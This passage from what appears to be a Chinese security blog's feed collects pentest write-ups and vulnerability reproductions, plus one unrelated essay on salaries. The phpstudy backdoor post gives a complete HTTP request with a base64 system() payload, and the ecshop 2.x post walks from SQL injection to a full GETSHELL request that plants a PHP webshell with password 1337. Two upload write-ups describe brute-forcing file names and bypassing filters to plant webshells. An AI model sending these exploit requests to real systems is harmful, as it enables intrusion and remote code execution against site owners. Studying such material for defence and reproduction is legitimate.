alt="20191127记一次任意文件上传"><br>经过长时间的测试，uploadUserNo参数中加上//会导致报错，可以看到文件真实路径(getshell后发现uploadUserNo参数的值会和文件名进行拼接，例如：uploadUserNo参数值为dd//时，文件名为：dd//_年月日时分秒四位随机数_上传文件名，因为文件名不允许有//等特殊字符，所以会报错)。<br>此时知道文件目录为TempFile，文件名随机重命名，能够看到其命名规则为【_年月日时分秒四位随机数_上传文件名】<br><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png" alt="20191127记一次任意文件上传"><br>与电脑时间同步上传，可能秒数会有偏差，假设为偏差间隔为3秒，加上四位随机数字。<br>重新上传一次文件，记录上传时间为：“2019年11月27日16时19分11秒”。然后构造数据包进行爆破。<br><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/4.png" alt="20191127记一次任意文件上传"><br>设置第一个标志位<br><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/5.png" alt="20191127记一次任意文件上传"><br>设置第二个标志位加载生成的0000-9999的4位数字典<br><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/6.png" alt="20191127记一次任意文件上传"><br>经过一段时间后爆破成功。<br><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/7.png" alt="20191127记一次任意文件上传"><br>访问会报错，但问题不大，拿shell客户端直接连接<br><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/8.png" alt="20191127记一次任意文件上传"><br>Getshell成功<br><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/9.png" alt="20191127记一次任意文件上传"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;很久没发文章了，一个是因为忙，另一个就是不知道发什么，这次遇到一个上传觉得挺有意思的，就分享一下思路。&lt;br&gt;在客户现场驻场遇到的站点，我们乙方在挖洞的同时，甲方也有十多个人在同步挖洞。我们少挖到洞还要找我们麻烦，欲哭无泪，太难了。&lt;br&gt;当时通过另外一个漏洞getshell，还在暗自高兴的时候，翻目录的时候，看到一个TempFile的目录下有个名为shell.aspx的文件，文件上传时间在目标给我们的前几个小时（客户在给我们目标前，就让甲方的渗透人员先测试了），此时的我笑容逐渐消失，意识到问题的严重性。&lt;/p&gt;</summary>
    
    
    
    <category term="原创文章" scheme="http://www.secice.cn/categories/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/"/>
    
    
    <category term="渗透实战" scheme="http://www.secice.cn/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    
    <category term="原创文章" scheme="http://www.secice.cn/tags/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title>phpstudy后门利用方法及getshell</title>
    <link href="http://www.secice.cn/p/c3ec4232"/>
    <id>http://www.secice.cn/p/c3ec4232</id>
    <published>2019-09-24T10:15:12.000Z</published>
    <updated>2020-11-23T09:04:26.510Z</updated>
    
    <content type="html"><![CDATA[<p>请求任意后缀为php的文件</p><p>目标环境为php5.2,5.4,且不能为nts</p><p>存在Accept-Encoding: gzip,deflate</p><p>此处填写base64加密后的payload：accept-charset: c3lzdGVtKCdjYWxjLmV4ZScpOw</p><p>PayLoad:</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/phpinfo.php</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 192.168.1.1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27<span class="hljs-attribute">Sec-Fetch-Mode</span>: navigate<span class="hljs-attribute">Sec-Fetch-User</span>: ?1<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3<span class="hljs-attribute">Sec-Fetch-Site</span>: none,<span class="hljs-attribute">accept-charset</span>: c3lzdGVtKCdjYWxjLmV4ZScpOw<span class="hljs-attribute">Accept-Encoding</span>: gzip,deflate<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9</code></pre><p> <img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20190924_phpstudy%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%8F%8Agetshell/01.jpg" alt="phpstudy后门利用方法及getshell"></p><p>其他更好玩的思路靠自己去思考</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;请求任意后缀为php的文件&lt;/p&gt;
&lt;p&gt;目标环境为php5.2,5.4,且不能为nts&lt;/p&gt;
&lt;p&gt;存在Accept-Encoding: gzip,deflate&lt;/p&gt;
&lt;p&gt;此处填写base64加密后的payload：accept-charset: c3lzdGVt</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://www.secice.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://www.secice.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="phpstudy" scheme="http://www.secice.cn/tags/phpstudy/"/>
    
  </entry>
  
  <entry>
    <title>莫名的感慨</title>
    <link href="http://www.secice.cn/p/7c8c6805"/>
    <id>http://www.secice.cn/p/7c8c6805</id>
    <published>2019-09-20T03:00:36.000Z</published>
    <updated>2020-11-23T09:04:27.119Z</updated>
    
    <content type="html"><![CDATA[<p>在学生时代感觉月薪一万好高，总觉得有1万元可以干很多事情，可以去旅游，可以买电脑啊，可以买零食等等</p><p>等工作，到手工资又一万了，反而感觉不高了。</p><p>这是一个正常的现象，这是很多大学生进入社会最深切的感受。</p><p>因为的你的生活水平变了，消费水平变高了，自然而然的对收入的要求也变高了。</p><p>俗话说的好，由俭入奢易，由奢入俭难。</p><a id="more"></a><p><strong>一.学生时代的你</strong></p><p>以前上学生活费都是家里给的，根本不会有经济压力，没钱了，就能够朝父母要。</p><p>况且给到手的钱都是实实在在的零花钱。</p><p>千把块一共就这么点还能花很长时间，所以毕业前感觉月薪一万很高。</p><p>学生时代的时候住的是宿舍，吃的是食堂，没有其他的大花销。在上学的时候交学费有父母，也体会不到赚钱的辛苦。</p><p>一般学校的宿舍住宿费都是一年一交，差不多都是1200左右一年，算下来只要100块钱一个月，更何况住宿费还是包含在学费里面，根本不用另外交。</p><p>学校的食堂吃饭荤菜3块-4块左右一个，蔬菜1块钱一个，一餐只要8块钱左右就已经能够满足日常基本需求，</p><p>一天基本算下来是早餐4元+中餐8元+晚餐8元，总共加起来20元就能活一天。</p><p>特别是在学生时代买新衣服和鞋子父母还会另外给钱。一个月除了吃饭日常花销600元，剩下的钱就能够出去改善伙食或者玩。</p><p>这种时候要是给你一万块钱，那肯定是很高，想买啥就买啥，想吃啥就吃啥，你当然会觉得月薪一万块好高。</p><p><strong>二.毕业以后的你</strong></p><p>1.固定开支大</p><p>每个月都会有固定的开支，房租，水电费，一日三餐，交通费，这些几乎都是固定开支。</p><p>这些钱都是要靠你自己的工资去支付。在社会上已经没有学校那么廉价的宿舍了，在外租房每个月都需要支出1500元以上，已经抵得上在学生时代一个月的生活费。</p><p>还有出社会以后也没有了那么便宜的食堂，一日三餐，最少花费早餐5元+午餐外卖15元+晚餐15元，一个月光吃饭最省都要1050元。</p><p>还有每日上班的交通费最少10元。一个月下来就最日常的食住行就要花费3000元左右。</p><p>2.社交开支少不了</p><p>工作后还少不了社交活动，比如说：与同事出去聚餐，基本开支的最少也要200元左右吧，</p><p>就算去路边的夜排挡开支也要100多以上，如果还有娱乐节目，去唱歌KTV，喝喝酒买几瓶饮料也是不少的费用.</p><p>当然了，邀请女生去看电影，吃饭、买饮料零食，送来回路程，这些费用也是需要花费的.</p><p>3.日常生活水平也提高</p><p>工作以后日常生活水平肯定也是提高的。逛街买衣服，衣服也越来越注重品牌，以前你可能一身衣服几百块，现在一身动不动就上千块。</p><p>4.人情世故少不了</p><p>在社会上，还少不了人情世故。学生的时候因为还没赚钱，朋友圈也没有到婚丧嫁娶的年纪，也没人会计较你给没给礼钱。</p><p>但是工作了就不一样了，朋友圈里面结婚、生孩子的也不少了。你就得各种凑份子钱，这也是一大笔的开销。</p><p>网友也在网络上各种调侃，过个五一、过个十一就得花费一个月甚至2个月的工资在礼金上，都快活不下去，要吃土了。</p><p>这样一对比下来一万块钱的工资还不如在学生时代的1000块钱经花。</p><p>因为生活质量提高了，钱花的也就快了，所以你感觉一万块几乎不够你用的了，就会觉得一万的工资也不高。</p><p>因此要想能够省下来钱，一种是降低你生活水平，减少日常花销。另外一种是提升自己的综合实力赚更多的钱。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在学生时代感觉月薪一万好高，总觉得有1万元可以干很多事情，可以去旅游，可以买电脑啊，可以买零食等等&lt;/p&gt;
&lt;p&gt;等工作，到手工资又一万了，反而感觉不高了。&lt;/p&gt;
&lt;p&gt;这是一个正常的现象，这是很多大学生进入社会最深切的感受。&lt;/p&gt;
&lt;p&gt;因为的你的生活水平变了，消费水平变高了，自然而然的对收入的要求也变高了。&lt;/p&gt;
&lt;p&gt;俗话说的好，由俭入奢易，由奢入俭难。&lt;/p&gt;</summary>
    
    
    
    <category term="胡思乱想" scheme="http://www.secice.cn/categories/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/"/>
    
    
    <category term="生活" scheme="http://www.secice.cn/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>ecshop2.x代码执行</title>
    <link href="http://www.secice.cn/p/1b10c1b1"/>
    <id>http://www.secice.cn/p/1b10c1b1</id>
    <published>2018-09-02T03:42:19.000Z</published>
    <updated>2020-11-23T09:04:26.335Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>问题发生在user.php的display函数，模版变量可控，导致注入，配合注入可达到远程代码执行</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01-SQL注入"></a>0x01-SQL注入</h3><p>先看user.php</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/01.jpg" alt="ecshop2.x代码执行"></p><a id="more"></a><p>$back_act变量来源于HTTP_REFERER，我们可控。</p><p>assign函数用于在模版变量里赋值</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/02.jpg" alt="ecshop2.x代码执行"></p><p>再看display函数</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/03.jpg" alt="ecshop2.x代码执行"></p><p><strong>读取user_passport.dwt模版文件内容，显示解析变量后的html内容，用_echash做分割，得到$k然后交给isnert_mod处理，由于_echash是默认的，不是随机生成的，所以$val内容可随意控制。</strong></p><p>再看insert_mod函数</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/04.jpg" alt="ecshop2.x代码执行"></p><p>非常关键的一个地方，这里进行了动态调用</p><p>$val传入进来用|分割，参数传入进来时需要被序列化</p><p>再看include/lib_insert.php中的insert_ads函数</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/05.jpg" alt="ecshop2.x代码执行"></p><p>可以看到这里直接就能注入了</p><p>payload:</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/user.php?act=login</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 127.0.0.1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="hljs-attribute">Cookie</span>: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1<span class="hljs-attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;&#125;<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Cache-Control</span>: max-age=0</code></pre><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/06.jpg" alt="ecshop2.x代码执行"></p><h3 id="0x02-代码执行"><a href="#0x02-代码执行" class="headerlink" title="0x02-代码执行"></a>0x02-代码执行</h3><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/07.jpg" alt="ecshop2.x代码执行"></p><p>继续看fetch函数</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/08.jpg" alt="ecshop2.x代码执行"></p><p>追踪_eval函数</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/09.jpg" alt="ecshop2.x代码执行"></p><p>$position_style变量来源于数据库中的查询结构</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/10.jpg" alt="ecshop2.x代码执行"></p><p>然后我们继续构造SQL注入，因为这段sql操作 order by部分换行了截断不了 所以需要在id处构造注释来配合num进行union查询</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/11.jpg" alt="ecshop2.x代码执行"></p><p>payload</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, <span class="hljs-keyword">RAND</span>() <span class="hljs-keyword">AS</span> rnd <span class="hljs-keyword">FROM</span> <span class="hljs-string">`ecshop27`</span>.<span class="hljs-string">`ecs_ad`</span> <span class="hljs-keyword">AS</span> a <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-string">`ecshop27`</span>.<span class="hljs-string">`ecs_ad_position`</span> <span class="hljs-keyword">AS</span> p <span class="hljs-keyword">ON</span> a.position_id = p.position_id <span class="hljs-keyword">WHERE</span> enabled = <span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> start_time &lt;= <span class="hljs-string">&#x27;1535678679&#x27;</span> <span class="hljs-keyword">AND</span> end_time &gt;= <span class="hljs-string">&#x27;1535678679&#x27;</span> <span class="hljs-keyword">AND</span> a.position_id = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">/*&#x27; ORDER BY rnd LIMIT */</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span><span class="hljs-comment">-- -</span></code></pre><p>函数中有一个判断</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/12.jpg" alt="ecshop2.x代码执行"></p><p>我们 id传入’/*</p><p>num传入*/ union select 1,0x272f2a,3,4,5,6,7,8,9,10– -就能绕过了</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/13.jpg" alt="ecshop2.x代码执行"></p><p>var_dump一下</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/14.jpg" alt="ecshop2.x代码执行"></p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/15.jpg" alt="ecshop2.x代码执行"></p><p>再看fetch函数,传入的参数被fetch_str函数处理了</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/16.jpg" alt="ecshop2.x代码执行"></p><p>追踪fetch_str函数，这里的字符串处理流程比较复杂</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/17.jpg" alt="ecshop2.x代码执行"></p><pre><code class="hljs php"><span class="hljs-keyword">return</span> preg_replace(<span class="hljs-string">&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/e&quot;</span>, <span class="hljs-string">&quot;\$this-&gt;select(&#x27;\\1&#x27;);&quot;</span>, <span class="hljs-variable">$source</span>);</code></pre><p>这一行意思是比如$source是xxxx{$asd}xxx,那么经过这行代码处理后就是返回this-&gt;select(‘$asd’)的结果</p><p>看看select函数</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/18.jpg" alt="ecshop2.x代码执行"></p><p>第一个字符为$时进入$this-&gt;get_val函数</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/19.jpg" alt="ecshop2.x代码执行"></p><p>我们$val没有.$又进入make_var函数</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/20.jpg" alt="ecshop2.x代码执行"></p><p>最后这里引入单引号从变量中逃逸</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/21.jpg" alt="ecshop2.x代码执行"></p><p>我们要闭合_var所以最终payload是</p><pre><code class="hljs php">&#123;<span class="hljs-variable">$asd</span><span class="hljs-string">&#x27;];assert(base64_decode(&#x27;</span>ZmlsZV9wdXRfY29udGVudHMoJzEudHh0JywnZ2V0c2hlbGwnKQ==<span class="hljs-string">&#x27;));//&#125;xxx</span></code></pre><p>会在网站跟目录生成1.txt 里面内容是getshell</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/22.jpg" alt="ecshop2.x代码执行"></p><p>GETSHELL exp:</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/user.php?act=login</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 127.0.0.1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="hljs-attribute">Cookie</span>: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1<span class="hljs-attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:280:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:3:&quot;&#x27;/*&quot;;&#125;<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Cache-Control</span>: max-age=0</code></pre><p>会在网站根目录生成1.php 密码是1337</p><p>文章转载自:<br><a href="http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;问题发生在user.php的display函数，模版变量可控，导致注入，配合注入可达到远程代码执行&lt;/p&gt;
&lt;h2 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞分析&quot;&gt;&lt;/a&gt;漏洞分析&lt;/h2&gt;&lt;h3 id=&quot;0x01-SQL注入&quot;&gt;&lt;a href=&quot;#0x01-SQL注入&quot; class=&quot;headerlink&quot; title=&quot;0x01-SQL注入&quot;&gt;&lt;/a&gt;0x01-SQL注入&lt;/h3&gt;&lt;p&gt;先看user.php&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/01.jpg&quot; alt=&quot;ecshop2.x代码执行&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="http://www.secice.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://www.secice.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Ecshop" scheme="http://www.secice.cn/tags/Ecshop/"/>
    
  </entry>
  
  <entry>
    <title>记一个奇葩的上传点</title>
    <link href="http://www.secice.cn/p/7819b580"/>
    <id>http://www.secice.cn/p/7819b580</id>
    <published>2018-08-22T11:08:19.000Z</published>
    <updated>2020-11-23T09:04:26.929Z</updated>
    
    <content type="html"><![CDATA[<p>最近一直很忙，V老哥发来一个站，说有一个上传点，问我要不要玩玩，当时太忙，就没去看，等过了几个小时以后，他说还没有突破，然后我叫他把后台和帐号密码发给我试试。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/01.jpg" alt="记一个奇葩的上传点"></p><p>先打开后台看看，发现后台还是挺炫酷的。</p><a id="more"></a><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/02.jpg" alt="记一个奇葩的上传点"></p><p>用帐号密码登录进后台，找到了上传的地方。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/03.jpg" alt="记一个奇葩的上传点"></p><p>打开burp，创建一个1.mp4文件，里面写phpinfo代码，然后发送到Repeater模块，点击go，可以发现是能够正常上传的。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/04.jpg" alt="记一个奇葩的上传点"></p><p>继续做测试，把文件名改成1.php;mp4</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/05.jpg" alt="记一个奇葩的上传点"></p><p>然后访问一下该页面，发现显示的是源码。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/06.jpg" alt="记一个奇葩的上传点"></p><p>接下来上传了一个1.rar;mp4。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/07.jpg" alt="记一个奇葩的上传点"></p><p>访问以后是下载该文件，正常人到这一步都会怀疑可能存在解析漏洞，但是该文件夹下面没有脚本执行权限。</p><p>接下来把文件名改成1.php试了下，发现上传回显还是mp4格式。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/08.jpg" alt="记一个奇葩的上传点"></p><p>陷入了沉思当中，仔细的看了数据包中的每一个参数，发现Cookie有点猫腻。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/09.jpg" alt="记一个奇葩的上传点"></p><p>于是我把php删除了，然后奇迹发生了。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/10.jpg" alt="记一个奇葩的上传点"></p><p>我访问看看，发现可以正常访问的。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/11.jpg" alt="记一个奇葩的上传点"></p><p>于是很激动的发给V哥这个地址，但是他却打不开。。。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/12.jpg" alt="记一个奇葩的上传点"></p><p>至于是什么原因应该是跟那个改了的Cookie有关，最后传了个马上去。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/13.jpg" 